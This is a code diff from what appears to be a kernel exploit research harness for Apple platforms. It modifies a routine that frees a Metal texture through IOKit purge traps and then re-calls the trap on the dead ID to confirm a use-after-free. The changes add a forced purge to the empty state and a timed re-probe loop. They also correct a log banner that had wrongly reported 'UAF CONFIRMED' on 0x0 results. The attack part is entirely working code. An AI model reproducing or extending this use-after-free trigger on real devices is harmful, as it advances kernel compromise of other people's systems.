@@ -292,20 +292,37 @@ static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h) {
     {
         kern_return_t krDead = g_trap2(conn, P065_SEL_PURGE, censusId, 1);
         p065_log(@"[v4] pre-kill purge(id=%u,state=1) kr=0x%x (live)", censusId, (unsigned)krDead);
-        legit = nil;          /* release the census texture */
+        /* v4b kill law (2026-10-25 18:59 hunt-12 run): ref-drop alone left the
+           entry ANSWERING — trap state=1 is volatile-only, the EMPTY/free
+           transition was never sent. Same law as the main app's v3.5. */
+        kern_return_t krNow = g_trap2(conn, P065_SEL_PURGE, censusId, 5);
+        p065_log(@"[v4b] purge-now(state=5) on the LIVE entry kr=0x%x", (unsigned)krNow);
+        NSUInteger mtlE = (NSUInteger)[legit setPurgeableState:MTLPurgeableStateEmpty];
+        p065_log(@"[v4b] MTL setPurgeableState(Empty) -> %lu", (unsigned long)mtlE);
+        legit = nil;          /* last client ref — entry dies if nothing pinned it */
+        kern_return_t krCheck = 0;
+        for (int k = 0; k < 5; k++) {
+            usleep(200000);
+            krCheck = g_trap2(conn, P065_SEL_PURGE, censusId, 1);
+            if (krCheck == 0xe00002c2) break;   /* really dead — ladder ends */
+        }
         g_seedTex = nil;
         g_seedBuf = nil;
-        usleep(200000);
-        kern_return_t krCheck = g_trap2(conn, P065_SEL_PURGE, censusId, 1);
-        p065_log(@"[v4] post-kill purge(dead id) kr=0x%x — 2c2 = entry really died", (unsigned)krCheck);
+        p065_log(@"[v4b] post-kill (1s re-probe ladder) purge(dead id) kr=0x%x — 2c2 = entry really died", (unsigned)krCheck);
         if (krCheck == P065_UAF_KR) {
             hits++;   /* dead-id purge already reporting NoResources */
         }
         for (int st = 5; st <= 6; st++) {
             kern_return_t krU = g_trap2(conn, P065_SEL_PURGE, censusId, st);
-            p065_log(@"[v4] DIRECT-STALE purge(dead id=%u, state=%d) kr=0x%x "
-                     "(0xe00002be = UAF CONFIRMED)", censusId, st, (unsigned)krU);
-            if (krU == P065_UAF_KR) hits++;
+            if (krU == P065_UAF_KR) {
+                p065_log(@"[v4] DIRECT-STALE purge(dead id=%u, state=%d) kr=0x%x "
+                         "0xe00002be = UAF CONFIRMED", censusId, st, (unsigned)krU);
+            } else {
+                /* honest banner (v4b drift fix: never label CONFIRMED at 0x0 —
+                   the 10-25 18:59 log ran this line twice as "0x0 UAF CONFIRMED") */
+                p065_log(@"[v4] DIRECT-STALE purge(dead id=%u, state=%d) kr=0x%x "
+                         "(no 2be — entry retained)", censusId, st, (unsigned)krU);
+            }
         }
         p065_log(@"[v4] direct-stale phase done, hits=%u", hits);
     }
